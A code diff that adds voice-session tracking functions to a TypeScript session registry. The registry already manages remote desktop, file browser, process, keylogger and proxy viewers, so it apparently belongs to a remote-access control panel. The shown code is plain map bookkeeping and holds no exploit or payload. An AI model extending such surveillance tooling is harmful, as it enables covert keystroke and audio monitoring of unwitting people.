@@ -4,6 +4,7 @@ import type {
   RemoteDesktopViewer,
   FileBrowserViewer,
   ProcessViewer,
+  VoiceViewer,
   NotificationsViewer,
   KeyloggerViewer,
   SocketData,
@@ -17,6 +18,7 @@ const processSessions = new Map<string, ProcessViewer>();
 const notificationSessions = new Map<string, NotificationsViewer>();
 const keyloggerSessions = new Map<string, KeyloggerViewer>();
 const proxySessions = new Map<string, KeyloggerViewer>(); // Reusing KeyloggerViewer interface for consistency
+const voiceSessions = new Map<string, VoiceViewer>();
 
 export function addConsoleSession(session: ConsoleSession): void {
   consoleSessions.set(session.id, session);
@@ -260,4 +262,24 @@ export function getProxySessionsByClient(
 
 export function getAllProxySessions(): Map<string, KeyloggerViewer> {
   return proxySessions;
+}
+
+export function addVoiceSession(session: VoiceViewer): void {
+  voiceSessions.set(session.id, session);
+}
+
+export function getVoiceSession(sessionId: string): VoiceViewer | undefined {
+  return voiceSessions.get(sessionId);
+}
+
+export function deleteVoiceSession(sessionId: string): boolean {
+  return voiceSessions.delete(sessionId);
+}
+
+export function getVoiceSessionsByClient(clientId: string): VoiceViewer[] {
+  return Array.from(voiceSessions.values()).filter((s) => s.clientId === clientId);
+}
+
+export function getAllVoiceSessions(): Map<string, VoiceViewer> {
+  return voiceSessions;
 }
